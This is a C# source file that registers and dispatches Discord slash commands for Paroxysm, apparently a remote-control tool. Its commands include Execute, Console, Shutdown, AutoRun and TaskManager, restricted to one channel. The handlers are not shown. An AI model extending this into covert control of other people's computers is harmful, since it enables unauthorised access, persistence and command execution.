using Discord;
using Discord.WebSocket;
using Paroxysm.Discord.Audit;
using Paroxysm.Discord.Commands;
using Paroxysm.Discord.Commands.Models;

namespace Paroxysm.Discord;

public static class DiscordCommand
{
    public static IEnumerable<ISlashCommand> GetCommands()
    {
        return new ISlashCommand[]
        {
            new ConsoleCmd(),
            new WallpaperCmd(),
            new PingCmd(),
            new ShutdownCmd(),
            new AutoRunCmd(),
            new CursorCmd(),
            new TaskManagerCmd(),
            new WebpageCmd(),
            new ExecuteCmd(),
            new UpdateCmd(),
            new SettingsCmd()
        };
    }


    public static Task OnMessageReceivedAsync(SocketMessage message)
    {
        return Task.CompletedTask;
    }

    public static Task OnSlashCommandExecute(SocketSlashCommand slashCommand)
    {
        if (!(slashCommand.Channel.Id == DiscordStatement.CurrentChannel.Id) && !(slashCommand.Id == (ulong)1170294233656217630)) return Task.CompletedTask;
        var command = GetCommands().FirstOrDefault(cmd => cmd.Options().Name == slashCommand.CommandName);
        if (command == null)
        {
            slashCommand.RespondAsync("Command not found", null, false, true);
        }

        var result = command?.Execute(slashCommand);
        var commandOptions =
            slashCommand.Data.Options.Count > 0 ? slashCommand.Data.Options.ElementAt(0).Value as string : "";
        Console.ForegroundColor = ConsoleColor.DarkCyan;
        Console.WriteLine(
            $"[Executor] -> \tUser {slashCommand.User.Username} has executed command /{slashCommand.CommandName} {commandOptions}");
        Console.ResetColor();

        slashCommand.RespondAsync(null, new[] { result }, false, true);
        AuditManager.LogCommandMessage(new EmbedAuthorBuilder
        {
            Name = slashCommand.User.Username,
            IconUrl = slashCommand.User.GetAvatarUrl()
        }, slashCommand.CommandName, result!.Description).GetAwaiter().GetResult();

        return Task.CompletedTask;
    }

    public static Task SetupSlashCommands()
    {
        Array.ForEach(GetCommands().ToArray(), command =>
        {
            var cmd = command.CreateSlashCommand().Build();
            DiscordStatement.DiscordClient.CreateGlobalApplicationCommandAsync(cmd);
            Console.WriteLine($"\t[Setup] Command /{cmd.Name} has been injected.");
        });

        return Task.CompletedTask;
    }
}